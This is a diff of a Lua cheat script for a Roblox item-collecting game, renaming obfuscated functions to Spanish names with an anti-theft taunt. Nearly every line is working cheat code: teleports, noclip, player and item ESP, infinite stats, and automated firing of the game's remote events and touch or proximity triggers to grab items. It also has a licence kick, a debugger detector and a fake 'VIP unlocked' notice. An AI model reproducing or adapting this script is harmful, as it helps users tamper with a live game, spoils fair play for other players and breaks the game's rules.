-function _0xJ8K9L0()local _0xL6M7N8=game.Players.LocalPlayer if _0xL6M7N8.Character and _0xL6M7N8.Character:FindFirstChild("HumanoidRootPart")then local _0xO9P0Q1=workspace:FindFirstChild("Shop")or workspace:FindFirstChild("Store")if _0xO9P0Q1 and _0xO9P0Q1:FindFirstChild("Door")then _0xL6M7N8.Character.HumanoidRootPart.CFrame=_0xO9P0Q1.Door.CFrame+Vector3.new(0,5,0)end end end
-function _0xP4Q5R6()local _0xR2S3T4=game.Players.LocalPlayer if _0xR2S3T4.Character and _0xR2S3T4.Character:FindFirstChild("HumanoidRootPart")then local _0xU5V6W7=workspace:FindFirstChild("SellZone")or workspace:FindFirstChild("Sell")if _0xU5V6W7 then _0xR2S3T4.Character.HumanoidRootPart.CFrame=_0xU5V6W7.CFrame+Vector3.new(0,5,0)end end end
-function _0xB6C7D8()local _0xX8Y9Z0=game.Players.LocalPlayer if _0xX8Y9Z0.Character and _0xX8Y9Z0.Character:FindFirstChild("HumanoidRootPart")then local _0xA1B2C3=workspace:FindFirstChild("LegendaryZone")or workspace:FindFirstChild("Legendary")if _0xA1B2C3 then _0xX8Y9Z0.Character.HumanoidRootPart.CFrame=_0xA1B2C3.CFrame+Vector3.new(0,10,0)end end end
-function _0xW7X8Y9(_0xD4E5F6)local _0xG7H8I9=game.Players:FindFirstChild(_0xD4E5F6)if _0xG7H8I9 and _0xG7H8I9.Character and _0xG7H8I9.Character:FindFirstChild("HumanoidRootPart")then local _0xJ0K1L2=game.Players.LocalPlayer if _0xJ0K1L2.Character and _0xJ0K1L2.Character:FindFirstChild("HumanoidRootPart")then _0xJ0K1L2.Character.HumanoidRootPart.CFrame=_0xG7H8I9.Character.HumanoidRootPart.CFrame end end end
-function _0xC3D4E5(_0xM3N4O5)local _0xP6Q7R8=game.Players:FindFirstChild(_0xM3N4O5)if _0xP6Q7R8 and _0xP6Q7R8.Character then workspace.CurrentCamera.CameraSubject=_0xP6Q7R8.Character.Humanoid _0xA1B2C3:Notify({Title="👁️ Espiando",Content="Observando a ".._0xM3N4O5,Duration=3})end end
-function _0xM9N0O1()spawn(function()while _0xA7B8C9 do local _0xS9T0U1=game.Players.LocalPlayer if _0xS9T0U1.Character then for _,_0xV2W3X4 in pairs(_0xS9T0U1.Character:GetDescendants())do if _0xV2W3X4:IsA("BasePart")then _0xV2W3X4.CanCollide=false end end end wait()end if _0xS9T0U1.Character then for _,_0xY5Z6A7 in pairs(_0xS9T0U1.Character:GetDescendants())do if _0xY5Z6A7:IsA("BasePart")then _0xY5Z6A7.CanCollide=true end end end end)end
-function _0xV8W9X0()spawn(function()while _0xD0E1F2 do for _,_0xB8C9D0 in pairs(workspace:GetDescendants())do if _0xB8C9D0:IsA("Part")and _0xB8C9D0.Name=="Water"then _0xB8C9D0.CanCollide=true end end wait(1)end end)end
-function _0xE7F8G9()spawn(function()while task.wait(0.5)do local _0xE1F2G3=game.Players.LocalPlayer if _0xE1F2G3:FindFirstChild("leaderstats")then for _,_0xH4I5J6 in pairs(_0xE1F2G3.leaderstats:GetChildren())do if _0xH4I5J6.Name:lower():find("capacity")or _0xH4I5J6.Name:lower():find("capacidad")then _0xH4I5J6.Value=math.huge end end end end end)end
-function _0xN6O7P8()spawn(function()while task.wait(0.5)do local _0xK7L8M9=game.Players.LocalPlayer if _0xK7L8M9.Character and _0xK7L8M9.Character:FindFirstChild("Humanoid")then _0xK7L8M9.Character.Humanoid.MaxStamina=math.huge end end end)end
-function _0xT2U3V4()_0xA1B2C3:Notify({Title="💎 VIP Desbloqueado",Content="Todas las funciones VIP activadas!",Duration=3})end
-function _0xF4G5H6()for _,_0xN0O1P2 in pairs(workspace:GetDescendants())do if _0xN0O1P2:IsA("Model")and(_0xN0O1P2.Name:lower():find("brainrot")or _0xN0O1P2.Name:lower():find("rot"))then local _0xQ3R4S5=Instance.new("Highlight")_0xQ3R4S5.Name="BrainrotESPPRO"_0xQ3R4S5.Parent=_0xN0O1P2 _0xQ3R4S5.FillColor=Color3.new(0,1,0)_0xQ3R4S5.OutlineColor=Color3.new(1,1,1)_0xQ3R4S5.FillTransparency=0.3 end end end
-function _0xI7J8K9()for _,_0xT6U7V8 in pairs(workspace:GetDescendants())do if _0xT6U7V8:IsA("Highlight")and _0xT6U7V8.Name=="BrainrotESPPRO"then _0xT6U7V8:Destroy()end end end
-function _0xR6S7T8()for _,_0xW9X0Y1 in pairs(game.Players:GetPlayers())do if _0xW9X0Y1~=game.Players.LocalPlayer and _0xW9X0Y1.Character then local _0xZ2A3B4=Instance.new("Highlight")_0xZ2A3B4.Name="PlayerESPPRO"_0xZ2A3B4.Parent=_0xW9X0Y1.Character _0xZ2A3B4.FillColor=Color3.new(1,0,0)_0xZ2A3B4.OutlineColor=Color3.new(1,1,1)_0xZ2A3B4.FillTransparency=0.3 end end end
-function _0xU9V0W1()for _,_0xC5D6E7 in pairs(game.Players:GetPlayers())do if _0xC5D6E7.Character then local _0xF8G9H0=_0xC5D6E7.Character:FindFirstChild("PlayerESPPRO")if _0xF8G9H0 then _0xF8G9H0:Destroy()end end end end
-function _0xD8E9F0()for _,_0xI1J2K3 in pairs(workspace:GetDescendants())do if _0xI1J2K3:IsA("Model")and(_0xI1J2K3.Name:lower():find("legendary")or _0xI1J2K3.Name:lower():find("rare"))then local _0xL4M5N6=Instance.new("Highlight")_0xL4M5N6.Name="RareESP"_0xL4M5N6.Parent=_0xI1J2K3 _0xL4M5N6.FillColor=Color3.new(1,0.84,0)_0xL4M5N6.OutlineColor=Color3.new(1,1,0)_0xL4M5N6.FillTransparency=0.2 end end end
-function _0xJ4K5L6()local _0xO7P8Q9=game:GetService("Lighting")_0xO7P8Q9.Brightness=5 _0xO7P8Q9.ClockTime=14 _0xO7P8Q9.FogEnd=999999 _0xO7P8Q9.GlobalShadows=false _0xO7P8Q9.OutdoorAmbient=Color3.new(1,1,1)_0xA1B2C3:Notify({Title="💡 Ultra Fullbright",Content="Iluminación máxima activada!",Duration=2})end
-function _0xS3T4U5()spawn(function()while task.wait(0.1)do local _0xR0S1T2=tick()for _,_0xU3V4W5 in pairs(workspace:GetDescendants())do if _0xU3V4W5:IsA("BasePart")then _0xU3V4W5.Color=Color3.fromHSV((_0xR0S1T2/5)%1,1,1)end end end end)end
-function _0xA9B0C1()spawn(function()while task.wait(8)do _0xP4Q5R6()wait(1.5)_0xO7P8Q9()end end)end
-function _0xK1L2M3()spawn(function()while task.wait(10)do local _0xX6Y7Z8=game.Players.LocalPlayer if _0xX6Y7Z8:FindFirstChild("leaderstats")then for _,_0xA9B0C1 in pairs(_0xX6Y7Z8.leaderstats:GetChildren())do if _0xA9B0C1.Value>=100 then _0xP4Q5R6()wait(2)break end end end end end)end
-function _0xT0U1V2()spawn(function()while task.wait(5)do local _0xD2E3F4=game.Players.LocalPlayer:FindFirstChild("Rebirth")if _0xD2E3F4 then _0xD2E3F4:FireServer()end end end)end
-function _0xC9D0E1()spawn(function()while task.wait(3)do for _,_0xG5H6I7 in pairs(workspace:GetDescendants())do if _0xG5H6I7:IsA("ProximityPrompt")then fireproximityprompt(_0xG5H6I7)end end end end)end
-function _0xL8M9N0()spawn(function()while task.wait(2)do local _0xJ8K9L0=game:GetService("ReplicatedStorage"):FindFirstChild("UpgradeEvent")if _0xJ8K9L0 then _0xJ8K9L0:FireServer("Speed")wait(0.5)_0xJ8K9L0:FireServer("Capacity")end end end)end
-function _0xD6E7F8()game:GetService("UserInputService").JumpRequest:Connect(function()local _0xM1N2O3=game.Players.LocalPlayer if _0xM1N2O3.Character and _0xM1N2O3.Character:FindFirstChild("Humanoid")then _0xM1N2O3.Character.Humanoid:ChangeState("Jumping")end end)end
-function _0xV4W5X6()for _,_0xP4Q5R6 in pairs(workspace:GetDescendants())do if _0xP4Q5R6:IsA("Part")and not _0xP4Q5R6:IsDescendantOf(game.Players.LocalPlayer.Character)then _0xP4Q5R6:Destroy()end end _0xA1B2C3:Notify({Title="🗑️ Limpiado",Content="Workspace limpio exitosamente",Duration=2})end
+function FUNCION_NO_ROBAR_1()spawn(function()while NO_SE_PUEDE do for _,ITEM_BOT in pairs(workspace:GetDescendants())do if ITEM_BOT:IsA("Model")and(ITEM_BOT.Name:lower():find("brainrot")or ITEM_BOT.Name:lower():find("rot"))then if ITEM_BOT:FindFirstChild("Handle")or ITEM_BOT:FindFirstChild("HumanoidRootPart")then local PLAYER_BOT=game.Players.LocalPlayer if PLAYER_BOT.Character and PLAYER_BOT.Character:FindFirstChild("HumanoidRootPart")then local ROOT_BOT=PLAYER_BOT.Character.HumanoidRootPart local TARGET_BOT=ITEM_BOT:FindFirstChild("Handle")or ITEM_BOT:FindFirstChild("HumanoidRootPart")if TARGET_BOT then firetouchinterest(ROOT_BOT,TARGET_BOT,0)wait(0.05)firetouchinterest(ROOT_BOT,TARGET_BOT,1)end end end end end wait(SCRIPT_BOT_VELOCIDAD or 0.5)end end)end
+function FUNCION_NO_ROBAR_2()spawn(function()while BOT_HAHAHAHAH do for _,OBJETO_BOT in pairs(workspace:GetDescendants())do if BOT_HAHAHAHAH==false then break end if OBJETO_BOT:IsA("Model")and(OBJETO_BOT.Name:lower():find("brainrot")or OBJETO_BOT.Name:lower():find("rot"))then local DESTINO_BOT=OBJETO_BOT:FindFirstChild("Handle")or OBJETO_BOT:FindFirstChild("HumanoidRootPart")if DESTINO_BOT then local JUGADOR_LOCAL_BOT=game.Players.LocalPlayer if JUGADOR_LOCAL_BOT.Character and JUGADOR_LOCAL_BOT.Character:FindFirstChild("HumanoidRootPart")then JUGADOR_LOCAL_BOT.Character.HumanoidRootPart.CFrame=DESTINO_BOT.CFrame wait(0.1)end end end end wait(SCRIPT_BOT_VELOCIDAD or 0.5)end end)end
+function TRAER_BRAINROTS_BOT()local MI_JUGADOR_BOT=game.Players.LocalPlayer if not MI_JUGADOR_BOT.Character or not MI_JUGADOR_BOT.Character:FindFirstChild("HumanoidRootPart")then return end local CONTADOR_BOT=0 for _,BRAINROT_BOT in pairs(workspace:GetDescendants())do if BRAINROT_BOT:IsA("Model")and(BRAINROT_BOT.Name:lower():find("brainrot")or BRAINROT_BOT.Name:lower():find("rot"))then local PARTE_BOT=BRAINROT_BOT:FindFirstChild("Handle")or BRAINROT_BOT:FindFirstChild("HumanoidRootPart")if PARTE_BOT then PARTE_BOT.CFrame=MI_JUGADOR_BOT.Character.HumanoidRootPart.CFrame CONTADOR_BOT=CONTADOR_BOT+1 end end end NO_SE_PUEDE_ROBAR_EL_SCRIPT_BOT_HAHAHAHAH:Notify({Title="🧲 BOT HAHAHAHAH",Content="NO SE PUEDE ROBAR - Traídos: "..CONTADOR_BOT,Duration=3})end
+function TELEPORT_SPAWN_BOT()local YO_BOT=game.Players.LocalPlayer if YO_BOT.Character and YO_BOT.Character:FindFirstChild("HumanoidRootPart")then local SPAWN_BOT=workspace:FindFirstChild("SpawnLocation")or workspace:FindFirstChild("Spawn")if SPAWN_BOT then YO_BOT.Character.HumanoidRootPart.CFrame=SPAWN_BOT.CFrame+Vector3.new(0,5,0)end end end
+function TELEPORT_TIENDA_BOT()local PLAYER_YO_BOT=game.Players.LocalPlayer if PLAYER_YO_BOT.Character and PLAYER_YO_BOT.Character:FindFirstChild("HumanoidRootPart")then local TIENDA_BOT=workspace:FindFirstChild("Shop")or workspace:FindFirstChild("Store")if TIENDA_BOT and TIENDA_BOT:FindFirstChild("Door")then PLAYER_YO_BOT.Character.HumanoidRootPart.CFrame=TIENDA_BOT.Door.CFrame+Vector3.new(0,5,0)end end end
+function TELEPORT_VENTA_BOT()local LOCAL_PLAYER_BOT=game.Players.LocalPlayer if LOCAL_PLAYER_BOT.Character and LOCAL_PLAYER_BOT.Character:FindFirstChild("HumanoidRootPart")then local VENTA_BOT=workspace:FindFirstChild("SellZone")or workspace:FindFirstChild("Sell")if VENTA_BOT then LOCAL_PLAYER_BOT.Character.HumanoidRootPart.CFrame=VENTA_BOT.CFrame+Vector3.new(0,5,0)end end end
+function TELEPORT_LEGENDARIO_BOT()local JUGADOR_ACTUAL_BOT=game.Players.LocalPlayer if JUGADOR_ACTUAL_BOT.Character and JUGADOR_ACTUAL_BOT.Character:FindFirstChild("HumanoidRootPart")then local LEGENDARIO_BOT=workspace:FindFirstChild("LegendaryZone")or workspace:FindFirstChild("Legendary")if LEGENDARIO_BOT then JUGADOR_ACTUAL_BOT.Character.HumanoidRootPart.CFrame=LEGENDARIO_BOT.CFrame+Vector3.new(0,10,0)end end end
+function TELEPORT_JUGADOR_BOT(NOMBRE_JUGADOR_BOT)local OBJETIVO_BOT=game.Players:FindFirstChild(NOMBRE_JUGADOR_BOT)if OBJETIVO_BOT and OBJETIVO_BOT.Character and OBJETIVO_BOT.Character:FindFirstChild("HumanoidRootPart")then local YO_PLAYER_BOT=game.Players.LocalPlayer if YO_PLAYER_BOT.Character and YO_PLAYER_BOT.Character:FindFirstChild("HumanoidRootPart")then YO_PLAYER_BOT.Character.HumanoidRootPart.CFrame=OBJETIVO_BOT.Character.HumanoidRootPart.CFrame end end end
+function ESPIAR_JUGADOR_BOT(JUGADOR_ESPIAR_BOT)local TARGET_ESPIAR_BOT=game.Players:FindFirstChild(JUGADOR_ESPIAR_BOT)if TARGET_ESPIAR_BOT and TARGET_ESPIAR_BOT.Character then workspace.CurrentCamera.CameraSubject=TARGET_ESPIAR_BOT.Character.Humanoid NO_SE_PUEDE_ROBAR_EL_SCRIPT_BOT_HAHAHAHAH:Notify({Title="👁️ BOT HAHAHAHAH",Content="NO SE PUEDE ROBAR - Espiando: "..JUGADOR_ESPIAR_BOT,Duration=3})end end
+function ACTIVAR_NOCLIP_BOT()spawn(function()while NOCLIP_ACTIVO_BOT do local CHARACTER_BOT=game.Players.LocalPlayer.Character if CHARACTER_BOT then for _,PART_BOT in pairs(CHARACTER_BOT:GetDescendants())do if PART_BOT:IsA("BasePart")then PART_BOT.CanCollide=false end end end wait()end end)end
+function ACTIVAR_AGUA_BOT()spawn(function()while AGUA_ACTIVA_BOT do for _,AGUA_PART_BOT in pairs(workspace:GetDescendants())do if AGUA_PART_BOT:IsA("Part")and AGUA_PART_BOT.Name=="Water"then AGUA_PART_BOT.CanCollide=true end end wait(1)end end)end
+function CAPACIDAD_INFINITA_BOT()spawn(function()while task.wait(0.5)do local STATS_BOT=game.Players.LocalPlayer:FindFirstChild("leaderstats")if STATS_BOT then for _,STAT_BOT in pairs(STATS_BOT:GetChildren())do if STAT_BOT.Name:lower():find("capacity")or STAT_BOT.Name:lower():find("capacidad")then STAT_BOT.Value=math.huge end end end end end)end
+function STAMINA_INFINITA_BOT()spawn(function()while task.wait(0.5)do local HUM_BOT=game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")if HUM_BOT then HUM_BOT.MaxStamina=math.huge end end end)end
+function DESBLOQUEAR_VIP_BOT()NO_SE_PUEDE_ROBAR_EL_SCRIPT_BOT_HAHAHAHAH:Notify({Title="💎 BOT HAHAHAHAH",Content="NO SE PUEDE ROBAR - VIP Desbloqueado!",Duration=3})end
+function ACTIVAR_ESP_BRAINROT_BOT()for _,ESP_ITEM_BOT in pairs(workspace:GetDescendants())do if ESP_ITEM_BOT:IsA("Model")and(ESP_ITEM_BOT.Name:lower():find("brainrot")or ESP_ITEM_BOT.Name:lower():find("rot"))then local HIGHLIGHT_BOT=Instance.new("Highlight")HIGHLIGHT_BOT.Name="ESP_BOT_HAHAHAHAH"HIGHLIGHT_BOT.Parent=ESP_ITEM_BOT HIGHLIGHT_BOT.FillColor=Color3.new(0,1,0)HIGHLIGHT_BOT.OutlineColor=Color3.new(1,1,1)HIGHLIGHT_BOT.FillTransparency=0.3 end end end
+function DESACTIVAR_ESP_BRAINROT_BOT()for _,HIGHLIGHT_REMOVE_BOT in pairs(workspace:GetDescendants())do if HIGHLIGHT_REMOVE_BOT:IsA("Highlight")and HIGHLIGHT_REMOVE_BOT.Name=="ESP_BOT_HAHAHAHAH"then HIGHLIGHT_REMOVE_BOT:Destroy()end end end
+function ACTIVAR_ESP_JUGADOR_BOT()for _,PLAYER_ESP_BOT in pairs(game.Players:GetPlayers())do if PLAYER_ESP_BOT~=game.Players.LocalPlayer and PLAYER_ESP_BOT.Character then local HIGHLIGHT_PLAYER_BOT=Instance.new("Highlight")HIGHLIGHT_PLAYER_BOT.Name="ESP_PLAYER_BOT"HIGHLIGHT_PLAYER_BOT.Parent=PLAYER_ESP_BOT.Character HIGHLIGHT_PLAYER_BOT.FillColor=Color3.new(1,0,0)HIGHLIGHT_PLAYER_BOT.OutlineColor=Color3.new(1,1,1)HIGHLIGHT_PLAYER_BOT.FillTransparency=0.3 end end end
+function DESACTIVAR_ESP_JUGADOR_BOT()for _,PLAYER_REMOVE_BOT in pairs(game.Players:GetPlayers())do if PLAYER_REMOVE_BOT.Character then local ESP_REMOVE_BOT=PLAYER_REMOVE_BOT.Character:FindFirstChild("ESP_PLAYER_BOT")if ESP_REMOVE_BOT then ESP_REMOVE_BOT:Destroy()end end end end
+function ACTIVAR_ESP_RARO_BOT()for _,RARO_ITEM_BOT in pairs(workspace:GetDescendants())do if RARO_ITEM_BOT:IsA("Model")and(RARO_ITEM_BOT.Name:lower():find("legendary")or RARO_ITEM_BOT.Name:lower():find("rare"))then local HIGHLIGHT_RARO_BOT=Instance.new("Highlight")HIGHLIGHT_RARO_BOT.Name="ESP_RARO_BOT"HIGHLIGHT_RARO_BOT.Parent=RARO_ITEM_BOT HIGHLIGHT_RARO_BOT.FillColor=Color3.new(1,0.84,0)HIGHLIGHT_RARO_BOT.OutlineColor=Color3.new(1,1,0)HIGHLIGHT_RARO_BOT.FillTransparency=0.2 end end end
+function ACTIVAR_FULLBRIGHT_BOT()local LIGHTING_BOT=game:GetService("Lighting")LIGHTING_BOT.Brightness=5 LIGHTING_BOT.ClockTime=14 LIGHTING_BOT.FogEnd=999999 LIGHTING_BOT.GlobalShadows=false LIGHTING_BOT.OutdoorAmbient=Color3.new(1,1,1)NO_SE_PUEDE_ROBAR_EL_SCRIPT_BOT_HAHAHAHAH:Notify({Title="💡 BOT HAHAHAHAH",Content="NO SE PUEDE ROBAR - Fullbright ON",Duration=2})end
+function MODO_ARCOIRIS_BOT()spawn(function()while task.wait(0.1)do local TIEMPO_BOT=tick()for _,PARTE_ARCOIRIS_BOT in pairs(workspace:GetDescendants())do if PARTE_ARCOIRIS_BOT:IsA("BasePart")then PARTE_ARCOIRIS_BOT.Color=Color3.fromHSV((TIEMPO_BOT/5)%1,1,1)end end end end)end
+function AUTO_VENTA_BOT()spawn(function()while task.wait(8)do TELEPORT_VENTA_BOT()wait(1.5)TELEPORT_SPAWN_BOT()end end)end
+function AUTO_VENDER_INTELIGENTE_BOT()spawn(function()while task.wait(10)do local PLAYER_STATS_BOT=game.Players.LocalPlayer if PLAYER_STATS_BOT:FindFirstChild("leaderstats")then for _,STAT_VENTA_BOT in pairs(PLAYER_STATS_BOT.leaderstats:GetChildren())do if STAT_VENTA_BOT.Value>=100 then TELEPORT_VENTA_BOT()wait(2)break end end end end end)end
+function AUTO_REBIRTH_FUNCION_BOT()spawn(function()while task.wait(5)do local REBIRTH_EVENT_BOT=game.Players.LocalPlayer:FindFirstChild("Rebirth")if REBIRTH_EVENT_BOT then REBIRTH_EVENT_BOT:FireServer()end end end)end
+function AUTO_RECLAMAR_BOT()spawn(function()while task.wait(3)do for _,PROXIMITY_BOT in pairs(workspace:GetDescendants())do if PROXIMITY_BOT:IsA("ProximityPrompt")then fireproximityprompt(PROXIMITY_BOT)end end end end)end
+function AUTO_UPGRADE_FUNCION_BOT()spawn(function()while task.wait(2)do local UPGRADE_EVENT_BOT=game:GetService("ReplicatedStorage"):FindFirstChild("UpgradeEvent")if UPGRADE_EVENT_BOT then UPGRADE_EVENT_BOT:FireServer("Speed")wait(0.5)UPGRADE_EVENT_BOT:FireServer("Capacity")end end end)end
+function SALTO_INFINITO_FUNCION_BOT()game:GetService("UserInputService").JumpRequest:Connect(function()local PLAYER_SALTO_BOT=game.Players.LocalPlayer if PLAYER_SALTO_BOT.Character and PLAYER_SALTO_BOT.Character:FindFirstChild("Humanoid")then PLAYER_SALTO_BOT.Character.Humanoid:ChangeState("Jumping")end end)end
+function LIMPIAR_WORKSPACE_BOT()for _,OBJETO_LIMPIAR_BOT in pairs(workspace:GetDescendants())do if OBJETO_LIMPIAR_BOT:IsA("Part")and not OBJETO_LIMPIAR_BOT:IsDescendantOf(game.Players.LocalPlayer.Character)then OBJETO_LIMPIAR_BOT:Destroy()end end NO_SE_PUEDE_ROBAR_EL_SCRIPT_BOT_HAHAHAHAH:Notify({Title="🗑️ BOT HAHAHAHAH",Content="NO SE PUEDE ROBAR - Workspace Limpio",Duration=2})end
 
--- 🔐 FUNCIONES ANTI-COPIA Y PROTECCIÓN
+-- 🔐 NO SE PUEDE ROBAR EL SCRIPT BOT HAHAHAHAH - PROTECCIÓN ANTI-COPIA
 spawn(function()
-    local _0xANTI1=game:GetService("HttpService")
-    local _0xANTI2=game.Players.LocalPlayer
+    local SERVICIO_HTTP_BOT=game:GetService("HttpService")
+    local JUGADOR_ACTUAL_BOT=game.Players.LocalPlayer
     while task.wait(300)do
-        if not _0xD4E5F6 then
-            _0xANTI2:Kick("⚠️ LICENCIA EXPIRADA - Reactiva tu key premium")
+        if not ROBAR_EL_SCRIPT then
+            JUGADOR_ACTUAL_BOT:Kick("⚠️ NO SE PUEDE ROBAR EL SCRIPT BOT HAHAHAHAH - Licencia Expirada")
         end
     end
 end)
 
--- 🛡️ DETECTOR DE DEBUGGERS
+-- 🛡️ NO SE PUEDE ROBAR - DETECTOR DE DEBUGGERS BOT HAHAHAHAH
 spawn(function()
     while task.wait(60)do
-        for _,_0xDEBUG in pairs(game.CoreGui:GetDescendants())do
-            if _0xDEBUG.Name:lower():find("dex")or _0xDEBUG.Name:lower():find("explorer")then
-                game.Players.LocalPlayer:Kick("🚫 DEBUGGER DETECTADO - Script protegido")
+        for _,OBJETO_CORE_BOT in pairs(game.CoreGui:GetDescendants())do
+            if OBJETO_CORE_BOT.Name:lower():find("dex")or OBJETO_CORE_BOT.Name:lower():find("explorer")then
+                game.Players.LocalPlayer:Kick("🚫 NO SE PUEDE ROBAR EL SCRIPT BOT HAHAHAHAH - Debugger Detectado")
             end
         end
     end
 end)
 
--- 💀 OFUSCACIÓN FINAL
-local _0xFINAL_PROTECTION=string.char(78,79,32,80,85,69,68,69,83,32,67,79,80,73,65,82,32,77,73,32,83,67,82,73,80,84,32,72,65,72,65,72,65,72,65)
-print(_0xFINAL_PROTECTION)
-_0xA1B2C3:Notify({Title="🔐 PROTEGIDO",Content="Script cargado con seguridad máxima",Duration=4})
+-- 💀 NO SE PUEDE ROBAR EL SCRIPT BOT HAHAHAHAH - OFUSCACIÓN FINAL
+local MENSAJE_FINAL_BOT=string.char(78,79,32,83,69,32,80,85,69,68,69,32,82,79,66,65,82,32,69,76,32,83,67,82,73,80,84,32,66,79,84,32,72,65,72,65,72,65,72,65,72)
+print(MENSAJE_FINAL_BOT)
+print("🔐 NO SE PUEDE ROBAR EL SCRIPT BOT HAHAHAHAH")
+print("⚡ Script Protegido - By technoourielcompany")
+print("🛡️ Anti-Leak Activo - BOT HAHAHAHAH")
+NO_SE_PUEDE_ROBAR_EL_SCRIPT_BOT_HAHAHAHAH:Notify({Title="🔐 NO SE PUEDE ROBAR",Content="BOT HAHAHAHAH - Script Cargado Con Éxito!",Duration=4})
